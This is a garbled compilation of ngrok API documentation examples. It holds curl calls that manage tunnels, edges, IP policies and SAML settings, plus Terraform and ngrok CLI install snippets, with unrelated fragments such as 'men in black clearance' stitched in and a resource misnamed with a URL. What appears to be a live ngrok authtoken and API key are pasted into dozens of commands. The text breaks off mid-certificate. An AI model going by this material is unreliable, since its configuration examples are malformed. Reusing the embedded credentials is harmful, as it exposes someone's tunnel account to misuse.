{ "id": "cert_2bMmWcJj1yNwg3nr80d93h4j9Et", "uri": "https://api.ngrok.com/tls_certificates/cert_2bMmWcJj1yNwg3nr80d93h4j9Et", "created_at": "2024-01-23T18:09:14Z", "certificate_pem": "-----BEGIN CERTIFICATE-----\nMIIDDTCCAfWgAwIBAgIUBUunDdA4gjgtEbZA8w9Ljhvl3bEwDQYJKoZIhvcNAQEL\nBQAwFjEUMBIGA1UEAwwLZXhhbXBsZS5jb20wHhcNMjAwMzI0MTgxODE5WhcNMjAw\nNDIzMTgxODE5WjAWMRQwEgYDVQQDDAtleGFtcGxlLmNvbTCCASIwDQYJKoZIhvcN\nAQEBBQADggEPADCCAQoCggEBAPKVkkKYNl3d9cqrz4tIFlwsohED5W4y1dcBixy4\nGANFFnw43nc2wPyKwYXumJqJIFrcW/NkUZL07bd+dou6mT6Gh/zbaTW91IkREPXL\n7b3KfVu4XkFosVXpWs0U6o4GrZ81CLiKBWI+H03x/ij5OSiJ1l71pqLeTJLOydAR\nAl8kpp7axeHU4UbDrAZkW5SnuZTjIKwVg0UNsBg1yNfUOu1Uah3BYaqPgQitC0Yg\nLW+NUGu/T91bkD7tLsVInkQXeQGdXBAqOycfJ7wj8OlIpyuXjTnGFA0izVmbQw5f\nrQnZ0geGyhLamvz9Gcd7mIlD/+/AEN9Lht82tAOzKG98/O8CAwEAAaNTMFEwHQYD\nVR0OBBYEFKv6RsvEC6T+zCtJZwB0FCR1sEkhMB8GA1UdIwQYMBaAFKv6RsvEC6T+\nzCtJZwB0FCR1sEkhMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB\nAC5fBrouinespo5+9AipjhY/HOKTg+OCnppFnSnqeU1eXZZJ0oakdHTpTNxtbQP9\ntOJTA2f3KWvmpNDMohEQXZz8wHDkdbrIXJKVp6zs1pEp+0BIjA4y9mSywa5xuyk0\noGeChRgGqp2JujDyPCb7LEaKKQEEdMqy73QG+jEAh14+wKixlAf1nATBdeCUvssK\n2x1uZMyqjJFB5y/5EdnWQzD4WJkrsCkxsZHVMN1d+dqf2sf3dTRV8fzsFGOG17NS\n6u2n9iGcFdBA82XN8yeLIWhy1t3GWutG1sdxENbFRRXea+iUqzDsmRtkaBma2GLQ\nd6JTpFbsCtwDjP23UEi7SZo=\n-----END CERTIFICATE-----\n", "subject_common_name": "example.com", "subject_alternative_names": { "dns_names": [], "ips": [] }, "issued_at": null, "not_before": "2020-03-24T18:18:19Z", "not_after": "2020-04-23T18:18:19Z", "key_usages": [], "extended_key_usages": [], "private_key_type": "rsa", "issuer_common_name": "example.com", "serial_number": "054ba70dd03882382d11b640f30f4b8e1be5ddb1", "subject_organization": "", "subject_organizational_unit": "", "subject_locality": "", "subject_province": "", "subject_country": "" }

DUNS # 000006

'edghtsrt_2b0vwyfS4hefz4fMo7Z9Mr6OfWy'

TUNNEL group Backend 'bkdtg_2b0vwsM7nbkREHxg8bDHm81vzXe' failover backend 'bkdfo_2b0vwxIMXb0AoED11AWnR1qJ0Al' HTTP Backend 'bkdhr_2b0vwxvB74HMoV9n9A5ma6MS5jn'

Global Domain 'https://lemming-topical-commonly.ngrok-free.app/'

'https://lemming-topical-commonly.ngrok-free.app/'

'https://lemming-topical-commonly.ngrok-free.app/'

'https://lemming-topical-commonly.ngrok-free.app/'

'https://lemming-topical-commonly.ngrok-free.app/'

backend identification 'edghtsrt_2b0vwyfS4hefz4fMo7Z9Mr6OfWy'

backend black 'edghtsrt_2b0wmZvfMaP5Pe014HWEtUT63KZ' endpoint backend 'edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9' Foundation Administration 'edghtsrt_2b0vwyfS4hefz4fMo7Z9Mr6OfWy'

docker run -it -e NGROK_AUTHTOKEN=2bTVg9fClAhPbL68J6xfOrgm0wX_5aMWASRkma1TdCsrjw75q ngrok/ngrok tunnel --label edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9 http://localhost:80 men in black clearance 'edghts_2b0vwydaasYfluOXqlIGU3IFbS9' sudo unzip ~/Downloads/ngrok-v3-stable-darwin-arm64.zip -d /usr/local/bin ngrok config add-authtoken 2bTVg9fClAhPbL68J6xfOrgm0wX_5aMWASRkma1TdCsrjw75q ngrok http http://localhost:8080 codesign --verify -d --verbose=2 /usr/local/bin/terraform

Executable=/usr/local/bin/terraform Identifier=terraform ... Authority=Developer ID Application: Hashicorp, Inc. (D38WU7D763) Authority=Developer ID Certification Authority Authority=Apple Root CA ... TeamIdentifier=D38WU7D763 ... wget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list sudo apt update && sudo apt install terraform

brew tap hashicorp/tap brew install hashicorp/tap/terraform

Code generated for API Clients. DO NOT EDIT. resource "ngrok_api_key" "example" { description = "ad-hoc dev testing" metadata = "{"environment":"dev"}" }

Configure the ngrok provider provider "ngrok" { api_key = "2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ" }

Create a new reserved domain resource "ngrok_reserved_domain" "my_domain" { name = "my-domain.example.com" region = "us" certificate_management_policy { authority = "letsencrypt" private_key_type = "ecdsa" } }

Configure the ngrok provider provider "ngrok" { api_key = "{2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" }

Provision an ngrok domain resource "ngrok_reserved_domain" "https://lemming-topical-commonly.ngrok-free.app/" { name = "my-domain.example.com" region = "us" certificate_management_policy { authority = "letsencrypt" private_key_type = "ecdsa" } } ngrok config add-api-key "{2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" ngrok api endpoints list curl https://api.ngrok.com -H "authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "ngrok-version: 2" curl -X PATCH -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"metadata":"{"environment": "production"}"}' https://api.ngrok.com/edges/tcp/edgtcp_2bMmXM8nYzBUUlcHS6zbuPXBEnk curl -X PATCH -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"metadata":"{"environment": "production"}"}' https://api.ngrok.com/edges/tcp/edgtcp_2bMmXM8nYzBUUlcHS6zbuPXBEnk { "id": "edgtcp_2bMmXM8nYzBUUlcHS6zbuPXBEnk", "description": "acme tcp edge", "metadata": "{"environment": "production"}", "created_at": "2024-01-23T18:09:20Z", "uri": "https://api.ngrok.com/edges/tcp/edgtcp_2bMmXM8nYzBUUlcHS6zbuPXBEnk", "hostports": null, "backend": null, "ip_restriction": null, "policies": null } curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/edges/tcp { "tcp_edges": [ { "id": "edgtcp_2bMmXM8nYzBUUlcHS6zbuPXBEnk", "description": "acme tcp edge", "metadata": "{"environment": "staging"}", "created_at": "2024-01-23T18:09:20Z", "uri": "https://api.ngrok.com/edges/tcp/edgtcp_2bMmXM8nYzBUUlcHS6zbuPXBEnk", "hostports": null, "backend": null, "ip_restriction": null, "policies": null } ], "uri": "https://api.ngrok.com/edges/tcp", "next_page_uri": null } curl -X POST -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"description":"acme tcp edge","metadata":"{"environment": "staging"}"}' https://api.ngrok.com/edges/tcp curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/edges/tcp/edgtcp_2bMmXM8nYzBUUlcHS6zbuPXBEnk

curl -X PATCH -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"ip_policy_ids":["ipp_2bMmWevCfjIjS5dolQMi5IS7JFg","ipp_2bMmWfb5W8B9Hi0dHMTwQkseIYV"]}' https://api.ngrok.com/ip_restrictions/ipx_2bMmWc1wqpsOUVP4H6EgqdIA9oQ

curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/ip_restrictions { "ip_restrictions": [ { "id": "ipx_2bMmWc1wqpsOUVP4H6EgqdIA9oQ", "uri": "https://api.ngrok.com/ip_restrictions/ipx_2bMmWc1wqpsOUVP4H6EgqdIA9oQ", "created_at": "2024-01-23T18:09:14Z", "enforced": false, "type": "dashboard", "ip_policies": [ { "id": "ipp_2bMmWevCfjIjS5dolQMi5IS7JFg", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmWevCfjIjS5dolQMi5IS7JFg" } ] } ], "uri": "https://api.ngrok.com/ip_restrictions", "next_page_uri": null } curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/ip_restrictions/ipx_2bMmWc1wqpsOUVP4H6EgqdIA9oQ { "id": "ipx_2bMmWc1wqpsOUVP4H6EgqdIA9oQ", "uri": "https://api.ngrok.com/ip_restrictions/ipx_2bMmWc1wqpsOUVP4H6EgqdIA9oQ", "created_at": "2024-01-23T18:09:14Z", "enforced": false, "type": "dashboard", "ip_policies": [ { "id": "ipp_2bMmWevCfjIjS5dolQMi5IS7JFg", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmWevCfjIjS5dolQMi5IS7JFg" }, { "id": "ipp_2bMmWfb5W8B9Hi0dHMTwQkseIYV", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmWfb5W8B9Hi0dHMTwQkseIYV" } ] } curl -X POST -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"type":"dashboard","ip_policy_ids":["ipp_2bMmWevCfjIjS5dolQMi5IS7JFg"]}' https://api.ngrok.com/ip_restrictions { "id": "ipx_2bMmWc1wqpsOUVP4H6EgqdIA9oQ", "uri": "https://api.ngrok.com/ip_restrictions/ipx_2bMmWc1wqpsOUVP4H6EgqdIA9oQ", "created_at": "2024-01-23T18:09:14Z", "enforced": false, "type": "dashboard", "ip_policies": [ { "id": "ipp_2bMmWevCfjIjS5dolQMi5IS7JFg", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmWevCfjIjS5dolQMi5IS7JFg" } ] }

curl -X PATCH -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"cidr":"212.3.15.0/24"}' https://api.ngrok.com/ip_policy_rules/ipr_2bMmWXfn5EKyQVA3FqQdQPyb60i

curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/ip_policy_rules { "ip_policy_rules": [ { "id": "ipr_2bMmWXfn5EKyQVA3FqQdQPyb60i", "uri": "https://api.ngrok.com/ip_policy_rules/ipr_2bMmWXfn5EKyQVA3FqQdQPyb60i", "created_at": "2024-01-23T18:09:13Z", "description": "nyc office", "cidr": "212.3.14.0/24", "ip_policy": { "id": "ipp_2bMmWWFWmR7ComTMLOYsvSZVXQZ", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmWWFWmR7ComTMLOYsvSZVXQZ" }, "action": "allow" }, { "id": "ipr_2bMmWVF4GwG3oKF1lW0IeiYysKd", "uri": "https://api.ngrok.com/ip_policy_rules/ipr_2bMmWVF4GwG3oKF1lW0IeiYysKd", "created_at": "2024-01-23T18:09:13Z", "description": "sf office", "cidr": "132.2.19.0/24", "ip_policy": { "id": "ipp_2bMmWWFWmR7ComTMLOYsvSZVXQZ", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmWWFWmR7ComTMLOYsvSZVXQZ" }, "action": "allow" }, { "id": "ipr_2bMmWU2KgbDxSxzPFluW1YS9aoF", "uri": "https://api.ngrok.com/ip_policy_rules/ipr_2bMmWU2KgbDxSxzPFluW1YS9aoF", "created_at": "2024-01-23T18:09:13Z", "description": "alan laptop", "cidr": "2.2.2.2/32", "ip_policy": { "id": "ipp_2bMmWWFWmR7ComTMLOYsvSZVXQZ", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmWWFWmR7ComTMLOYsvSZVXQZ" }, "action": "allow" } ], "uri": "https://api.ngrok.com/ip_policy_rules", "next_page_uri": null }

curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/ip_policy_rules/ipr_2bMmWXfn5EKyQVA3FqQdQPyb60i { "id": "ipr_2bMmWXfn5EKyQVA3FqQdQPyb60i", "uri": "https://api.ngrok.com/ip_policy_rules/ipr_2bMmWXfn5EKyQVA3FqQdQPyb60i", "created_at": "2024-01-23T18:09:13Z", "description": "nyc office", "cidr": "212.3.15.0/24", "ip_policy": { "id": "ipp_2bMmWWFWmR7ComTMLOYsvSZVXQZ", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmWWFWmR7ComTMLOYsvSZVXQZ" }, "action": "allow" } curl -X POST -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"description":"nyc office","cidr":"212.3.14.0/24","ip_policy_id":"ipp_2bMmWWFWmR7ComTMLOYsvSZVXQZ","action":"allow"}' https://api.ngrok.com/ip_policy_rules

curl -X PATCH -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"metadata":"metadata={"pod-id": "b3d9c464-4f48-4783-a741-d7d7d5db310f"}"}' https://api.ngrok.com/ip_policies/ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm

{ "id": "ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "created_at": "2024-01-23T18:08:52Z", "description": "API Outbound Gateway", "metadata": "metadata={"pod-id": "b3d9c464-4f48-4783-a741-d7d7d5db310f"}" } curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/ip_policies { "ip_policies": [ { "id": "ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "created_at": "2024-01-23T18:08:52Z", "description": "API Outbound Gateway" }, { "id": "ipp_2bMmTrLwuYPTUgWKsZV9KbwQCJ7", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmTrLwuYPTUgWKsZV9KbwQCJ7", "created_at": "2024-01-23T18:08:52Z", "description": "Developer Environments" } ], "uri": "https://api.ngrok.com/ip_policies", "next_page_uri": null } curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/ip_policies/ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm { "id": "ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "created_at": "2024-01-23T18:08:52Z", "description": "API Outbound Gateway", "metadata": "metadata={"pod-id": "b3d9c464-4f48-4783-a741-d7d7d5db310f"}" } curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/ip_policies/ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm { "id": "ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "created_at": "2024-01-23T18:08:52Z", "description": "API Outbound Gateway", "metadata": "metadata={"pod-id": "b3d9c464-4f48-4783-a741-d7d7d5db310f"}" } curl -X POST -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"description":"API Outbound Gateway"}' https://api.ngrok.com/ip_policies { "id": "ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "created_at": "2024-01-23T18:08:52Z", "description": "API Outbound Gateway" } curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/edges/https/edghts_2bMmXUJV6pkem9Gb9RTfI86KyNI/tls_termination { "enabled": true, "terminate_at": "edge", "min_version": "1.3" } curl -X PUT -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"enabled":true,"min_version":"1.3"}' https://api.ngrok.com/edges/https/edghts_2bMmXUJV6pkem9Gb9RTfI86KyNI/tls_termination

curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/edges/https/edghts_2bMmXOcKR64QqFa8q1fI6OBoU7i/routes/edghtsrt_2bMmXN1WwZhK3p4mBHgLIhVP8SL/websocket_tcp_converter { "enabled": true } curl -X PUT -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"enabled":true}' https://api.ngrok.com/edges/https/edghts_2bMmXOcKR64QqFa8q1fI6OBoU7i/routes/edghtsrt_2bMmXN1WwZhK3p4mBHgLIhVP8SL/websocket_tcp_converter { "enabled": true }

curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/edges/https/edghts_2bMmXMcOjoq8S1BvJN3HYY5b7F4/routes/edghtsrt_2bMmXL0vXPehNqON4Q4gEEByT6Q/webhook_verification curl -X PUT -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"enabled":true,"provider":"TWILIO","secret":"secret_token"}' https://api.ngrok.com/edges/https/edghts_2bMmXMcOjoq8S1BvJN3HYY5b7F4/routes/edghtsrt_2bMmXL0vXPehNqON4Q4gEEByT6Q/webhook_verification { "enabled": true, "provider": "TWILIO", "secret": "secret_token" } curl -X DELETE -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/edges/https/edghts_2bMmXLm72GkoHS8tCdzOuTQcG5r/routes/edghtsrt_2bMmXQ1tcvPsx0op3cx8T1C1WSO/user_agent_filter

curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/edges/https/edghts_2bMmXLm72GkoHS8tCdzOuTQcG5r/routes/edghtsrt_2bMmXQ1tcvPsx0op3cx8T1C1WSO/user_agent_filter { "enabled": true, "allow": ["(Pingdom.com_bot_version_)(\d+).(\d+)"], "deny": ["(made_up_bot)/(\d+).(\d+)"] } curl -X PUT -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"enabled":true,"allow":["(Pingdom.com_bot_version_)(\d+).(\d+)"],"deny":["(made_up_bot)/(\d+).(\d+)"]}' https://api.ngrok.com/edges/https/edghts_2bMmXLm72GkoHS8tCdzOuTQcG5r/routes/edghtsrt_2bMmXQ1tcvPsx0op3cx8T1C1WSO/user_agent_filter { "enabled": true, "allow": ["(Pingdom.com_bot_version_)(\d+).(\d+)"], "deny": ["(made_up_bot)/(\d+).(\d+)"] } curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/edges/https/edghts_2bMmXGZh5RnDO7bAgszNuVae4M3/routes/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN/saml { "enabled": true, "options_passthrough": false, "cookie_prefix": "", "inactivity_timeout": 0, "maximum_duration": 0, "idp_metadata_url": "", "idp_metadata": "\n\u003cEntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" validUntil="2020-09-14T12:53:23.691Z" cacheDuration="PT1M" entityID="http://127.0.0.1:12345/metadata\"\u003e\u003cIDPSSODescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"\u003e\u003cNameIDFormat\u003eurn:oasis:names:tc:SAML:2.0:nameid-format:transient\u003c/NameIDFormat\u003e\u003cSingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="http://127.0.0.1:12345/sso\"\u003e\u003c/SingleSignOnService\u003e\u003cSingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="http://127.0.0.1:12345/sso\"\u003e\u003c/SingleSignOnService\u003e\u003c/IDPSSODescriptor\u003e\u003c/EntityDescriptor\u003e\n", "force_authn": false, "allow_idp_initiated": true, "authorized_groups": [], "entity_id": "https://idp.local-ngrok.com/saml/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN", "assertion_consumer_service_url": "https://idp.local-ngrok.com/saml/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN/acs", "single_logout_url": "https://idp.local-ngrok.com/saml/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN/slo", "request_signing_certificate_pem": "-----BEGIN CERTIFICATE-----\nMIIEBDCCAuygAwIBAgIRAOT8A8TGFjL7kvO/m0bVKR8wDQYJKoZIhvcNAQELBQAw\ngaAxTjBMBgNVBAoMRWh0dHBzOi8vaWRwLmxvY2FsLW5ncm9rLmNvbS9zYW1sL2Vk\nZ2h0c3J0XzJiTW1YRmthUFRMRTl4eVhUVFR4aWdCUlJFTjFOMEwGA1UEAwxFaHR0\ncHM6Ly9pZHAubG9jYWwtbmdyb2suY29tL3NhbWwvZWRnaHRzcnRfMmJNbVhGa2FQ\nVExFOXh5WFRUVHhpZ0JSUkVOMCAXDTI0MDEyMzE4MDkxOVoYDzIwNTkwMTE0MTgw\nOTE5WjCBoDFOMEwGA1UECgxFaHR0cHM6Ly9pZHAubG9jYWwtbmdyb2suY29tL3Nh\nbWwvZWRnaHRzcnRfMmJNbVhGa2FQVExFOXh5WFRUVHhpZ0JSUkVOMU4wTAYDVQQD\nDEVodHRwczovL2lkcC5sb2NhbC1uZ3Jvay5jb20vc2FtbC9lZGdodHNydF8yYk1t\nWEZrYVBUTEU5eHlYVFRUeGlnQlJSRU4wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw\nggEKAoIBAQCvvcWPTZy3bIjnFSZfEPwGwZcOzkNnIQrNlX5v7SsucJHCxtCNKt9B\nzi6HTcRteOGEydVOr3Lg8MX8DdEecOt4e0Hf0NeChbX1gYsS1b2+0Q9sf9sH7fu1\n1F5y7zOlVRvWjuars3HVYqGQkTBATAcqkvUuUJeHzyWleQ8CXL3Ixp2TcJa/7fsz\njW2Heg4CX6Lx3E3Z6cGh2hFi1VFuKdeAufgZGbAbIBUpAnMAwMdJI/MLp3D4fHQv\n0VCwdXKhWt+SvidWVBg2Tv97phncbNMPNVi6VERO8+n7A5qdHG9efGnOTrLnxzJu\n97AfRBU8I88kdy4trPy9xeFBwnvlnlhZAgMBAAGjNTAzMA4GA1UdDwEB/wQEAwIH\ngDATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEB\nCwUAA4IBAQAWA4t3JKL1cjV+CO+doaad/QhlbfW+tbI2n3tuRlrvZWtJKATuKFBZ\nFOqp20EfaeOgtMyDRDU8UNLoMWVT8zNUmzh4MtkrBQkUplPCuBHf844gJtDJdcA8\nxFj/vJyuET18b7fn4ppPG6RAqwH5nbAQ18zbKr8MgEWK0YbX4Wb+3fZVRfbKMFPp\nGs9CoZyC/Tz0z50xI3Am4d8QxibQQOinAuPQk6HcyP5Eg+bdUrBYTEdWircNZ1Hs\nDVIblwsbQ7TvDp+qtzyVjbtwa8yLBSlPRXkoYaXKhU9ziIYT1GIqrhV2KNO8qXn7\nGNTnpMopy0wcdJ05v4S12jFaKFknbvTv\n-----END CERTIFICATE-----\n", "metadata_url": "https://idp.local-ngrok.com/saml/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN", "nameid_format": "urn:oasis:names:tc:SAML:2.0:nameid-format:persistent" } curl -X PUT -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"enabled":true,"idp_metadata":"\n\u003cEntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" validUntil="2020-09-14T12:53:23.691Z" cacheDuration="PT1M" entityID="http://127.0.0.1:12345/metadata\"\u003e\u003cIDPSSODescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"\u003e\u003cNameIDFormat\u003eurn:oasis:names:tc:SAML:2.0:nameid-format:transient\u003c/NameIDFormat\u003e\u003cSingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="http://127.0.0.1:12345/sso\"\u003e\u003c/SingleSignOnService\u003e\u003cSingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="http://127.0.0.1:12345/sso\"\u003e\u003c/SingleSignOnService\u003e\u003c/IDPSSODescriptor\u003e\u003c/EntityDescriptor\u003e\n"}' https://api.ngrok.com/edges/https/edghts_2bMmXGZh5RnDO7bAgszNuVae4M3/routes/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN/saml { "enabled": true, "options_passthrough": false, "cookie_prefix": "", "inactivity_timeout": 0, "maximum_duration": 0, "idp_metadata_url": "", "idp_metadata": "\n\u003cEntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" validUntil="2020-09-14T12:53:23.691Z" cacheDuration="PT1M" entityID="http://127.0.0.1:12345/metadata\"\u003e\u003cIDPSSODescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"\u003e\u003cNameIDFormat\u003eurn:oasis:names:tc:SAML:2.0:nameid-format:transient\u003c/NameIDFormat\u003e\u003cSingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="http://127.0.0.1:12345/sso\"\u003e\u003c/SingleSignOnService\u003e\u003cSingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="http://127.0.0.1:12345/sso\"\u003e\u003c/SingleSignOnService\u003e\u003c/IDPSSODescriptor\u003e\u003c/EntityDescriptor\u003e\n", "force_authn": false, "allow_idp_initiated": true, "authorized_groups": [], "entity_id": "https://idp.local-ngrok.com/saml/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN", "assertion_consumer_service_url": "https://idp.local-ngrok.com/saml/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN/acs", "single_logout_url": "https://idp.local-ngrok.com/saml/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN/slo", "request_signing_certificate_pem": "-----BEGIN 